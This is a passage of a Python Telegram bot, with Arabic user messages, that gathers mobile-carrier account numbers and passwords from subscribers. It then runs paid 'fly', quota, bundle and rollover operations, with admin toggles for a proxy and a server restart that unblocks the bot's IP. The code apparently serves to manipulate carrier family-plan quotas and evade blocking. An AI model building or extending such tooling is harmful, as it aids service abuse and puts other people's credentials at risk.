            bot.answer_callback_query(call.id, "🛑 جاري الإيقاف...")
        except Exception:
            pass
        try:
            bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
        except Exception:
            pass
    else:
        try:
            bot.answer_callback_query(call.id, "⚠️ لا توجد عملية نشطة")
        except Exception:
            pass

# ── Accept invitation (fly) ────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("acc_yes_") or c.data.startswith("acc_no_"))
def cb_accept(call):
    uid = call.message.chat.id
    set_accept_resp(uid, call.data.startswith("acc_yes_"))
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass

# ── Retry/Skip ─────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("retry_yes_") or c.data.startswith("retry_no_"))
def cb_retry(call):
    uid = call.message.chat.id
    set_retry_resp(uid, call.data.startswith("retry_yes_"))
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("skip_yes_"))
def cb_skip_yes(call):
    uid = call.message.chat.id
    target_uid = int(call.data.split("_")[-1])
    if uid != target_uid:
        try:
            bot.answer_callback_query(call.id, "مش ليك")
        except Exception:
            pass
        return
    set_skip_resp(target_uid, True)
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass
    try:
        bot.answer_callback_query(call.id, "✅ تم التخطي")
    except Exception:
        pass

# ── Post-operation nota yes/no ────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("post_nota_yes_") or c.data.startswith("post_nota_no_"))
def cb_post_nota(call):
    uid = call.message.chat.id
    set_accept_resp(uid, call.data.startswith("post_nota_yes_"))
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass

# ── Post-operation rollover yes/no ────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("post_roll_yes_") or c.data.startswith("post_roll_no_"))
def cb_post_roll(call):
    uid = call.message.chat.id
    set_accept_resp(uid, call.data.startswith("post_roll_yes_"))
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass

# ── Post-operation renewal yes/no ─────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("post_renew_yes_") or c.data.startswith("post_renew_no_"))
def cb_post_renew(call):
    uid = call.message.chat.id
    set_accept_resp(uid, call.data.startswith("post_renew_yes_"))
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    try:
        bot.edit_message_reply_markup(uid, call.message.message_id, reply_markup=None)
    except Exception:
        pass

# ── Channel check ─────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("check_channel_"))
def cb_check_channel(call):
    uid = call.message.chat.id
    try:
        target_uid = int(call.data.split("_")[2])
    except (ValueError, IndexError):
        try:
            bot.answer_callback_query(call.id, "خطأ")
        except Exception:
            pass
        return
    if uid != target_uid:
        try:
            bot.answer_callback_query(call.id, "هذا الزر مش ليك")
        except Exception:
            pass
        return
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, uid)
        if member.status in ['member', 'administrator', 'creator']:
            try:
                bot.edit_message_text("✅ تم التحقق من اشتراكك.", uid, call.message.message_id, parse_mode="HTML")
            except Exception:
                pass
            safe_send(uid, "👇 اضغط /start لتبدأ.", reply_markup=main_kb(uid))
            try:
                bot.answer_callback_query(call.id, "تم التحقق بنجاح")
            except Exception:
                pass
        else:
            try:
                bot.answer_callback_query(call.id, "لازم تشترك في القناة الأول", show_alert=True)
            except Exception:
                pass
    except Exception:
        try:
            bot.answer_callback_query(call.id, "خطأ في التحقق", show_alert=True)
        except Exception:
            pass

# ── Quota selection ───────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("quota_"))
def cb_quota(call):
    uid = call.message.chat.id
    state = get_user_state(uid, "step")
    if state != "fly_quota":
        try:
            bot.answer_callback_query(call.id, "⚠️ انتهت الجلسة")
        except Exception:
            pass
        return
    pct_map = {"quota_10": ("10", "10% 🟢"), "quota_20": ("20", "20% 🟡"), "quota_40": ("40", "40% 🔴")}
    pct, lbl = pct_map.get(call.data, ("10", "10%"))
    data = get_user_state(uid, "data", {})
    data["pct"] = pct
    data["pct_lbl"] = lbl
    set_user_state(uid, "step", "fly_confirm")
    set_user_state(uid, "data", data)
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_fly"),
        types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel_op"),
    )
    try:
        bot.edit_message_text(
            f"⚠️ *تأكيد التطيير*\n\n👤 المالك: `{data['owner']}`\n👥 الفرد: `{data['member']}`\n📊 النسبة: {lbl}\n\nهل تؤكد؟",
            uid, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
    except Exception:
        pass
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

# ── Confirm fly ───────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "confirm_fly")
def cb_confirm_fly(call):
    uid = call.message.chat.id
    state = get_user_state(uid, "step")
    if state != "fly_confirm":
        try:
            bot.answer_callback_query(call.id, "⚠️ انتهت الجلسة")
        except Exception:
            pass
        return
    d = get_user_state(uid, "data", {})
    clear_user_state(uid)
    try:
        bot.edit_message_text("⏳ جاري بدء عملية التطيير...", uid, call.message.message_id)
    except Exception:
        pass
    threading.Thread(target=fly_single_thread, daemon=True, name=f"fly-{uid}",
                     args=(d["owner"], d["owner_pass"], d["member"], d["member_pass"],
                           d["pct"], d["pct_lbl"], uid)).start()
    try:
        bot.answer_callback_query(call.id, "✅ بدأت العملية")
    except Exception:
        pass

# ── Confirm multi ─────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "confirm_multi")
def cb_confirm_multi(call):
    uid = call.message.chat.id
    state = get_user_state(uid, "step")
    if state != "multi_confirm":
        try:
            bot.answer_callback_query(call.id, "⚠️ انتهت الجلسة")
        except Exception:
            pass
        return
    d = get_user_state(uid, "data", {})
    clear_user_state(uid)
    try:
        bot.edit_message_text("⏳ جاري بدء العملية المتعددة...", uid, call.message.message_id)
    except Exception:
        pass
    # تحقق من وجود كل البيانات قبل بدء الـ thread
    required_keys = ["o1", "op1", "o2", "op2", "m1", "mp1", "m2", "mp2"]
    missing = [k for k in required_keys if k not in d or not d[k]]
    if missing:
        print(f"[MULTI] ❌ Missing keys: {missing} — data: {list(d.keys())}")
        safe_send(uid, f"❌ بيانات ناقصة. اضغط /start وابدأ من جديد.")
        safe_send(uid, "اضغط /start للعودة.", reply_markup=main_kb(uid))
        try:
            bot.answer_callback_query(call.id, "❌ بيانات ناقصة")
        except Exception:
            pass
        return
    try:
        bot.answer_callback_query(call.id, "✅ بدأت العملية")
    except Exception:
        pass
    print(f"[MULTI] 🚀 Starting multi-step for user {uid}")
    threading.Thread(target=multi_step_thread, daemon=True, name=f"multi-{uid}",
                     args=(d["o1"], d["op1"], d["o2"], d["op2"],
                           d["m1"], d["mp1"], d["m2"], d["mp2"], uid)).start()

# ── Cancel operation ──────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "cancel_op")
def cb_cancel_op(call):
    uid = call.message.chat.id
    clear_user_state(uid)
    try:
        bot.edit_message_text("❌ تم الإلغاء.", uid, call.message.message_id)
        bot.answer_callback_query(call.id)
    except Exception:
        pass
    safe_send(uid, "اضغط /start للعودة.", reply_markup=main_kb(uid))

# ── Eligibility bundle select ─────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("elig_b_"))
def cb_elig_b(call):
    uid = call.message.chat.id
    idx = int(call.data.replace("elig_b_", ""))
    bundle = BUNDLES_ALL[idx]
    data = pop_user_state(uid, "data", {})
    try:
        bot.edit_message_text(f"🔍 جاري الفحص لـ {bundle['name']}...", uid, call.message.message_id)
    except Exception:
        pass
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    def do():
        try:
            ok, msg = svc_eligibility(data["number"], data["password"], bundle["id"])
            record("فحص التأهيل", ok, uid)
            safe_send(uid, msg, reply_markup=main_kb(uid))
        except Exception as e:
            safe_send(uid, f"❌ خطأ: {e}", reply_markup=main_kb(uid))
    threading.Thread(target=do, daemon=True, name=f"elig-{uid}").start()

# ── Nota bundle select ────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("nota_b_"))
def cb_nota_b(call):
    uid = call.message.chat.id
    idx = int(call.data.replace("nota_b_", ""))
    bundle = BUNDLES_ALL[idx]
    data = pop_user_state(uid, "data", {})
    try:
        bot.edit_message_text(f"⏳ جاري تفعيل {bundle['name']}...", uid, call.message.message_id)
    except Exception:
        pass
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    def do():
        try:
            ok, msg = svc_nota_all(data["number"], data["password"], bundle)
            record("نوتة كل الأنظمة", ok, uid)
            safe_send(uid, msg, reply_markup=main_kb(uid))
        except Exception as e:
            safe_send(uid, f"❌ خطأ: {e}", reply_markup=main_kb(uid))
    threading.Thread(target=do, daemon=True, name=f"nota-{uid}").start()

# ════════════════════════════════════════════════════════════════
# 🤖 Admin callback handlers
# ════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data.startswith("adm_"))
def cb_admin_actions(call):
    global BOT_OPEN, USE_PROXY
    uid = call.message.chat.id
    if not is_admin(uid):
        try:
            bot.answer_callback_query(call.id, "⛔")
        except Exception:
            pass
        return

    d = call.data
    if d == "adm_toggle_open":
        BOT_OPEN = not BOT_OPEN
        safe_edit(uid, call.message.message_id, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())
        try:
            bot.answer_callback_query(call.id, f"البوت: {'🟢 مفتوح' if BOT_OPEN else '🔴 مغلق'}")
        except Exception:
            pass

    elif d == "adm_toggle_proxy":
        USE_PROXY = not USE_PROXY
        safe_edit(uid, call.message.message_id, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())
        try:
            bot.answer_callback_query(call.id, f"البروكسي: {'🔵 يعمل' if USE_PROXY else '⚪ معطّل'}")
        except Exception:
            pass

    elif d == "adm_add_sub":
        set_user_state(uid, "step", "awaiting_sub_id")
        set_user_state(uid, "action", "add_sub")
        safe_send(uid, "🆔 ابعت ID المستخدم:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_add_sub_days":
        set_user_state(uid, "step", "awaiting_sub_id")
        set_user_state(uid, "action", "add_sub_days")
        safe_send(uid, "🆔 ابعت ID المستخدم:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_add_sub_stars":
        set_user_state(uid, "step", "awaiting_sub_id")
        set_user_state(uid, "action", "add_sub_stars")
        safe_send(uid, "🆔 ابعت ID المستخدم:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_add_stars":
        set_user_state(uid, "step", "awaiting_stars_uid")
        safe_send(uid, "⭐ ابعت ID المستخدم:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_del_stars":
        set_user_state(uid, "step", "awaiting_del_stars_uid")
        safe_send(uid, "➖ ابعت ID المستخدم:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_del_sub":
        set_user_state(uid, "step", "awaiting_del_sub_id")
        safe_send(uid, "➖ ابعت ID المستخدم للحذف:", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

    elif d == "adm_refresh":
        safe_edit(uid, call.message.message_id, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())
        try:
            bot.answer_callback_query(call.id, "🔄 تم التحديث")
        except Exception:
            pass

    elif d == "adm_progress":
        prog_text, prog_count = build_progress_dashboard()
        # أزرار العودة والتحديث
        prog_mk = types.InlineKeyboardMarkup()
        prog_mk.add(
            types.InlineKeyboardButton("🔄 تحديث التقدم", callback_data="adm_progress"),
            types.InlineKeyboardButton("🔙 لوحة التحكم", callback_data="adm_back_dashboard"),
        )
        try:
            bot.edit_message_text(prog_text, uid, call.message.message_id,
                                  parse_mode="Markdown", reply_markup=prog_mk)
        except Exception:
            safe_send(uid, prog_text, parse_mode="Markdown", reply_markup=prog_mk)
        try:
            bot.answer_callback_query(call.id, f"📊 {prog_count} عملية نشطة")
        except Exception:
            pass

    elif d == "adm_back_dashboard":
        safe_edit(uid, call.message.message_id, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())
        try:
            bot.answer_callback_query(call.id, "🔙 لوحة التحكم")
        except Exception:
            pass

    elif d == "adm_section_status":
        safe_edit(uid, call.message.message_id, admin_section_status(), parse_mode="Markdown", reply_markup=_adm_section_kb("status"))
        try:
            bot.answer_callback_query(call.id, "📊 الحالة العامة")
        except Exception:
            pass

    elif d == "adm_section_ops":
        safe_edit(uid, call.message.message_id, admin_section_operations(), parse_mode="Markdown", reply_markup=_adm_section_kb("ops"))
        try:
            bot.answer_callback_query(call.id, "🔗 العمليات النشطة")
        except Exception:
            pass

    elif d == "adm_section_stats":
        safe_edit(uid, call.message.message_id, admin_section_stats(), parse_mode="Markdown", reply_markup=_adm_section_kb("stats"))
        try:
            bot.answer_callback_query(call.id, "📈 الإحصائيات")
        except Exception:
            pass

    elif d == "adm_section_subs":
        safe_edit(uid, call.message.message_id, admin_section_subscribers(), parse_mode="Markdown", reply_markup=_adm_section_kb("subs"))
        try:
            bot.answer_callback_query(call.id, "👥 المشتركون")
        except Exception:
            pass

    elif d == "adm_section_track":
        safe_edit(uid, call.message.message_id, admin_section_tracking(), parse_mode="Markdown", reply_markup=_adm_section_kb("track"))
        try:
            bot.answer_callback_query(call.id, "📋 تتبع المستخدمين")
        except Exception:
            pass

    elif d == "adm_restart_railway":
        safe_send(uid, "⏳ *جاري إعادة تشغيل السيرفر...*\nقد يستغرق بضع ثوانٍ...", parse_mode="Markdown")
        try:
            bot.answer_callback_query(call.id, "🔁 جاري إعادة التشغيل...")
        except Exception:
            pass
        def _do_restart():
            ok, msg = railway_restart()
            if ok:
                unblock_ip()
            safe_send(uid, msg, parse_mode="Markdown")
        threading.Thread(target=_do_restart, daemon=True, name=f"railway-restart").start()
    else:
        try:
            bot.answer_callback_query(call.id)
        except Exception:
            pass

# ════════════════════════════════════════════════════════════════
# 🤖 Message handlers — text input for services & admin
# ════════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text in ["🛑 إيقاف العملية", "📊 تقدم عمليتي", "🎛️ لوحة التحكم"])
def cmd_quick_buttons(msg):
    uid = msg.chat.id
    text = msg.text

    if text == "🎛️ لوحة التحكم":
        if is_admin(uid):
            safe_send(uid, admin_dashboard(), parse_mode="Markdown", reply_markup=admin_inline_kb())
        return

    if text == "🛑 إيقاف العملية":
        stop_ev = get_user_stop_event(uid)
        stop_ev.set()
        safe_send(uid, "🛑 جاري إيقاف العملية...", reply_markup=main_kb(uid))
        return

    if text == "📊 تقدم عمليتي":
        prog = get_user_progress(uid)
        if not prog:
            safe_send(uid, "📋 لا توجد عملية جارية لك حالياً.", reply_markup=main_kb(uid))
            return
        # صاحب البوت يرى التفاصيل الكاملة، المشتركون يرون رقم الخطوة فقط
        if is_admin(uid):
            prog_text = _fmt_progress_text(prog, uid)
            steps = prog.get("steps", {})
            done_count = sum(1 for s in steps.values() if s == "done")
            total_count = len(steps)
            prog_text = f"📊 *تقدم عمليتك* ({done_count}/{total_count})\n━━━━━━━━━━━━━━━━━━━━\n\n" + prog_text
        else:
            prog_text = _fmt_progress_text_subscriber(prog, uid)
        safe_send(uid, prog_text, parse_mode="Markdown")
        return

@bot.message_handler(content_types=["text"])
def handle_text(msg):
    uid = msg.chat.id
    text = msg.text.strip()

    with _users_seen_lock:
        users_seen.add(uid)
    register_user(uid)

    # ── State-based admin flows ───────────────────────────────
    step = get_user_state(uid, "step")
    action = get_user_state(uid, "action")

    if step == "awaiting_sub_id":
        try:
            target_uid = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم ID صحيح.")
            return

        if action == "add_sub":
            add_subscriber(target_uid, added_by=uid)
            clear_user_state(uid)
            safe_send(uid, f"✅ تم إضافة المشترك `{target_uid}` (غير محدود).")
            return
        elif action == "add_sub_days":
            set_user_state(uid, "step", "awaiting_days_count")
            set_user_state(uid, "target_uid", target_uid)
            safe_send(uid, f"📅 ابعت عدد الأيام للمستخدم `{target_uid}`:")
            return
        elif action == "add_sub_stars":
            set_user_state(uid, "step", "awaiting_stars_count")
            set_user_state(uid, "target_uid", target_uid)
            safe_send(uid, f"⭐ ابعت عدد النجوم للمستخدم `{target_uid}`:")
            return

    if step == "awaiting_days_count":
        try:
            days = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم صحيح.")
            return
        target_uid = get_user_state(uid, "target_uid", 0)
        add_subscriber(target_uid, added_by=uid, days=days, sub_type="days")
        clear_user_state(uid)
        safe_send(uid, f"✅ تم إضافة المشترك `{target_uid}` ({days} يوم).")
        return

    if step == "awaiting_stars_count":
        try:
            stars = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم صحيح.")
            return
        target_uid = get_user_state(uid, "target_uid", 0)
        add_subscriber(target_uid, added_by=uid, sub_type="stars", stars=stars)
        clear_user_state(uid)
        safe_send(uid, f"✅ تم إضافة المشترك `{target_uid}` ({stars} نجمة).")
        return

    if step == "awaiting_stars_uid":
        try:
            target_uid = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم ID صحيح.")
            return
        set_user_state(uid, "step", "awaiting_add_stars_count")
        set_user_state(uid, "target_uid", target_uid)
        safe_send(uid, f"⭐ ابعت عدد النجوم لزيادتها للمستخدم `{target_uid}`:")
        return

    if step == "awaiting_add_stars_count":
        try:
            stars = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم صحيح.")
            return
        target_uid = get_user_state(uid, "target_uid", 0)
        add_stars(target_uid, stars)
        clear_user_state(uid)
        safe_send(uid, f"✅ تم إضافة {stars} نجمة للمستخدم `{target_uid}`.")
        return

    if step == "awaiting_del_stars_uid":
        try:
            target_uid = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم ID صحيح.")
            return
        set_user_state(uid, "step", "awaiting_del_stars_count")
        set_user_state(uid, "target_uid", target_uid)
        safe_send(uid, f"➖ ابعت عدد النجوم لحذفها من المستخدم `{target_uid}`:")
        return

    if step == "awaiting_del_stars_count":
        try:
            stars = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم صحيح.")
            return
        target_uid = get_user_state(uid, "target_uid", 0)
        del_stars(target_uid, stars)
        clear_user_state(uid)
        safe_send(uid, f"✅ تم حذف {stars} نجمة من المستخدم `{target_uid}`.")
        return

    if step == "awaiting_del_sub_id":
        try:
            target_uid = int(text)
        except ValueError:
            safe_send(uid, "❌ ابعت رقم ID صحيح.")
            return
        remove_subscriber(target_uid)
        clear_user_state(uid)
        safe_send(uid, f"✅ تم حذف المشترك `{target_uid}`.")
        return

    # ════════════════════════════════════════════════════════════════
    # 📌 جميع فحوصات الـ step (قبل أزرار الخدمات) — إصلاح مشكلة الإدخال
    # ════════════════════════════════════════════════════════════════

    # ── Fly single steps ────────────────────────────────────────
    if step == "fly_owner":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "owner": text})
        set_user_state(uid, "step", "fly_owner_pass")
        safe_send(uid, "🔑 ابعت كلمة سر المالك:")
        return

    if step == "fly_owner_pass":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "owner_pass": text})
        set_user_state(uid, "step", "fly_member")
        safe_send(uid, "👥 ابعت رقم الفرد:", parse_mode="Markdown")
        return

    if step == "fly_member":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "member": text})
        set_user_state(uid, "step", "fly_member_pass")
        safe_send(uid, "🔑 ابعت كلمة سر الفرد:")
        return

    if step == "fly_member_pass":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "member_pass": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*", parse_mode="Markdown")
        def _validate_fly():
            r1 = validate_credentials(d["owner"], d["owner_pass"])
            r2 = validate_credentials(d["member"], d["member_pass"])
            results = [("المالك", d["owner"], r1), ("الفرد", d["member"], r2)]
            lines = []
            all_ok = True
            for label, num, (ok, msg) in results:
                lines.append(f"{'✅' if ok else '❌'} {label} ({num}): {msg}")
                if not ok:
                    all_ok = False
            if not all_ok:
                safe_send(uid, "🔍 *نتيجة التحقق:*\n\n" + "\n".join(lines), parse_mode="Markdown")
                set_user_state(uid, "step", "fly_owner")
                return
            set_user_state(uid, "step", "fly_quota")
            mk = types.InlineKeyboardMarkup(row_width=3)
            mk.add(
                types.InlineKeyboardButton("10%", callback_data="quota_10"),
                types.InlineKeyboardButton("20%", callback_data="quota_20"),
                types.InlineKeyboardButton("40%", callback_data="quota_40"),
            )
            safe_send(uid,
                f"✅ *جميع البيانات صحيحة!*\n\n📊 اختر النسبة:\n\n👤 المالك: `{d.get('owner', '')}`\n👥 الفرد: `{d.get('member', '')}`",
                parse_mode="Markdown", reply_markup=mk)
        threading.Thread(target=_validate_fly, daemon=True, name=f"val-fly-{uid}").start()
        return

    # ── Multi-step steps ────────────────────────────────────────
    if step == "multi_o1":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "o1": text})
        set_user_state(uid, "step", "multi_op1")
        safe_send(uid, "🔑 Owner1 — ابعت كلمة السر:")
        return

    if step == "multi_op1":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "op1": text})
        set_user_state(uid, "step", "multi_o2")
        safe_send(uid, "👤 Owner2 — ابعت الرقم:")
        return

    if step == "multi_o2":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "o2": text})
        set_user_state(uid, "step", "multi_op2")
        safe_send(uid, "🔑 Owner2 — ابعت كلمة السر:")
        return

    if step == "multi_op2":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "op2": text})
        set_user_state(uid, "step", "multi_m1")
        safe_send(uid, "👥 الفرد الأول — ابعت الرقم:")
        return

    if step == "multi_m1":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "m1": text})
        set_user_state(uid, "step", "multi_mp1")
        safe_send(uid, "🔑 الفرد الأول — ابعت كلمة السر:")
        return

    if step == "multi_mp1":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "mp1": text})
        set_user_state(uid, "step", "multi_m2")
        safe_send(uid, "👥 الفرد الثاني — ابعت الرقم:")
        return

    if step == "multi_m2":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "m2": text})
        set_user_state(uid, "step", "multi_mp2")
        safe_send(uid, "🔑 الفرد الثاني — ابعت كلمة السر:")
        return

    if step == "multi_mp2":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "mp2": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*\n(قد يستغرق بضع ثوانٍ)", parse_mode="Markdown")
        def _validate_multi():
            creds = [
                ("Owner1", d.get("o1"), d.get("op1")),
                ("Owner2", d.get("o2"), d.get("op2")),
                ("الفرد الأول", d.get("m1"), d.get("mp1")),
                ("الفرد الثاني", d.get("m2"), d.get("mp2")),
            ]
            results = []
            for label, num, pw in creds:
                ok, msg = validate_credentials(num, pw)
                results.append((label, num, ok, msg))
            lines = []
            all_ok = True
            for label, num, ok, msg in results:
                lines.append(f"{'✅' if ok else '❌'} {label} ({num}): {msg}")
                if not ok:
                    all_ok = False
            if not all_ok:
                safe_send(uid, "🔍 *نتيجة التحقق:*\n\n" + "\n".join(lines), parse_mode="Markdown")
                set_user_state(uid, "step", "multi_o1")
                return
            set_user_state(uid, "step", "multi_confirm")
            mk = types.InlineKeyboardMarkup()
            mk.add(
                types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_multi"),
                types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel_op"),
            )
            safe_send(uid,
                f"✅ *جميع البيانات صحيحة!*\n\n"
                f"⚠️ *تأكيد العملية المتعددة*\n\n"
                f"👤 Owner1: `{d.get('o1', '')}`\n"
                f"👤 Owner2: `{d.get('o2', '')}`\n"
                f"👥 الفرد 1: `{d.get('m1', '')}`\n"
                f"👥 الفرد 2: `{d.get('m2', '')}`\n\n"
                f"هل تؤكد؟",
                parse_mode="Markdown", reply_markup=mk)
        threading.Thread(target=_validate_multi, daemon=True, name=f"val-multi-{uid}").start()
        return

    # ── Eligibility steps ──────────────────────────────────────
    if step == "elig_number":
        set_user_state(uid, "data", {"number": text})
        set_user_state(uid, "step", "elig_password")
        safe_send(uid, "🔑 ابعت كلمة السر:")
        return

    if step == "elig_password":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "password": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*", parse_mode="Markdown")
        def _validate_elig():
            ok, msg = validate_credentials(d["number"], d["password"])
            if not ok:
                safe_send(uid, f"❌ {msg}\n\nاضغط /start للمحاولة مرة أخرى.", parse_mode="Markdown", reply_markup=main_kb(uid))
                clear_user_state(uid)
                return
            set_user_state(uid, "step", "elig_bundle")
            mk = types.InlineKeyboardMarkup(row_width=3)
            for i, b in enumerate(BUNDLES_ALL):
                mk.add(types.InlineKeyboardButton(b["name"], callback_data=f"elig_b_{i}"))
            safe_send(uid, "✅ البيانات صحيحة\n\n📦 اختر الباقة للفحص:", reply_markup=mk)
        threading.Thread(target=_validate_elig, daemon=True, name=f"val-elig-{uid}").start()
        return

    # ── Nota all steps ──────────────────────────────────────────
    if step == "nota_number":
        set_user_state(uid, "data", {"number": text})
        set_user_state(uid, "step", "nota_password")
        safe_send(uid, "🔑 ابعت كلمة السر:")
        return

    if step == "nota_password":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "password": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*", parse_mode="Markdown")
        def _validate_nota():
            ok, msg = validate_credentials(d["number"], d["password"])
            if not ok:
                safe_send(uid, f"❌ {msg}\n\nاضغط /start للمحاولة مرة أخرى.", parse_mode="Markdown", reply_markup=main_kb(uid))
                clear_user_state(uid)
                return
            set_user_state(uid, "step", "nota_bundle")
            mk = types.InlineKeyboardMarkup(row_width=3)
            for i, b in enumerate(BUNDLES_ALL):
                mk.add(types.InlineKeyboardButton(b["name"], callback_data=f"nota_b_{i}"))
            safe_send(uid, "✅ البيانات صحيحة\n\n📦 اختر الباقة للتفعيل:", reply_markup=mk)
        threading.Thread(target=_validate_nota, daemon=True, name=f"val-nota-{uid}").start()
        return

    # ── Nota15 steps ───────────────────────────────────────────
    if step == "nota15_number":
        set_user_state(uid, "data", {"number": text})
        set_user_state(uid, "step", "nota15_password")
        safe_send(uid, "🔑 ابعت كلمة السر:")
        return

    if step == "nota15_password":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "password": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*", parse_mode="Markdown")
        def _validate_nota15():
            ok, msg = validate_credentials(d["number"], d["password"])
            if not ok:
                safe_send(uid, f"❌ {msg}\n\nاضغط /start للمحاولة مرة أخرى.", parse_mode="Markdown", reply_markup=main_kb(uid))
                clear_user_state(uid)
                return
            clear_user_state(uid)
            safe_send(uid, "✅ البيانات صحيحة\n⏳ جاري تفعيل نوتة فليكس 15...")
            try:
                ok2, msg2 = svc_nota15(d["number"], d["password"])
                record("نوتة فليكس 15", ok2, uid)
                safe_send(uid, msg2, reply_markup=main_kb(uid))
            except Exception as e:
                safe_send(uid, f"❌ خطأ: {e}", reply_markup=main_kb(uid))
        threading.Thread(target=_validate_nota15, daemon=True, name=f"val-nota15-{uid}").start()
        return

    # ── Rollover steps ─────────────────────────────────────────
    if step == "roll_number":
        set_user_state(uid, "data", {"number": text})
        set_user_state(uid, "step", "roll_password")
        safe_send(uid, "🔑 ابعت كلمة السر:")
        return

    if step == "roll_password":
        set_user_state(uid, "data", {**get_user_state(uid, "data", {}), "password": text})
        d = get_user_state(uid, "data", {})
        safe_send(uid, "🔍 *جاري التحقق من البيانات...*", parse_mode="Markdown")
        def _validate_roll():
            ok, msg = validate_credentials(d["number"], d["password"])
            if not ok:
                safe_send(uid, f"❌ {msg}\n\nاضغط /start للمحاولة مرة أخرى.", parse_mode="Markdown", reply_markup=main_kb(uid))
                clear_user_state(uid)
                return
            clear_user_state(uid)
            safe_send(uid, "✅ البيانات صحيحة\n⏳ جاري تزويد الأيام...")
            try:
                ok2, msg2 = svc_rollover(d["number"], d["password"])
                record("تزويد أيام", ok2, uid)
                safe_send(uid, msg2, reply_markup=main_kb(uid))
            except Exception as e:
                safe_send(uid, f"❌ خطأ: {e}", reply_markup=main_kb(uid))
        threading.Thread(target=_validate_roll, daemon=True, name=f"val-roll-{uid}").start()
        return

    # ════════════════════════════════════════════════════════════════
    # 📌 أزرار الخدمات (بعد فحص الـ steps)
    # ════════════════════════════════════════════════════════════════

    # ── Fly single flow ───────────────────────────────────────
    if text == "🚀 تطيير فردي":
        access = check_access(uid)
        if access == "ip_blocked":
            send_ip_blocked_msg(uid)
            return
        if access != "ok":
            send_no_access_msg(uid)
            return
        svc_access = check_service_access(uid, "🚀 تطيير فردي")
        if svc_access == "star_blocked":
